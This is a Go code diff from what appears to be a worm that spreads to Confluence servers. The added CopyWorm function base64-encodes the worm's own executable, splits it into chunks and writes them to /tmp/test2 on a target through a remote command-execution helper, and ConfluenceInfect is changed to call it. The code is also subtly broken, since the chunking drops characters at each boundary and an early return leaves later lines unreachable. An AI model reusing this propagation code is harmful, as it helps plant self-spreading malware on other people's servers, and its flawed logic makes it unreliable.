@@ -43,6 +43,33 @@ func ConfluenceCmdExecute(targetUrl string, endpoint string, cmd string) string 
 		return strings.Contains(resp, "wormHere")
 	}
 
+  func CopyWorm(url string, endpoint string,worm64 string) {
+    length := len(worm64)
+    slice := 130000
+    begin := 0
+    end := begin+slice
+    if end >= length {
+      end = length-1
+    }
+    copyWorm := worm64[begin:end]
+    command := fmt.Sprintf("echo %s | tee %s",copyWorm,"/tmp/test2")
+    ConfluenceCmdExecute(url, endpoint, command)
+    begin = end+1
+    end = end+slice
+    for begin < length {
+      fmt.Println(begin)
+      if end >= length {
+        end = length-1
+      }
+      copyWorm := worm64[begin:end]
+      command := fmt.Sprintf("echo %s | tee -a %s",copyWorm,"/tmp/test2")
+      ConfluenceCmdExecute(url, endpoint, command)
+      begin = end+1
+      end = end+slice
+    }
+    return
+  }
+
 	func ConfluenceInfect(url string, endpoint string) bool {
 		var worm []byte
 		var copyTemplate string
@@ -51,6 +78,8 @@ func ConfluenceCmdExecute(targetUrl string, endpoint string, cmd string) string 
 
 		worm = GetFile("/proc/self/exe")
 		worm64 := base64.StdEncoding.EncodeToString(worm)
+    CopyWorm(url, endpoint, worm64)
+    return false
 		command := fmt.Sprintf(copyTemplate, worm64, wormPath)
 		ConfluenceCmdExecute(url, endpoint, command)
 
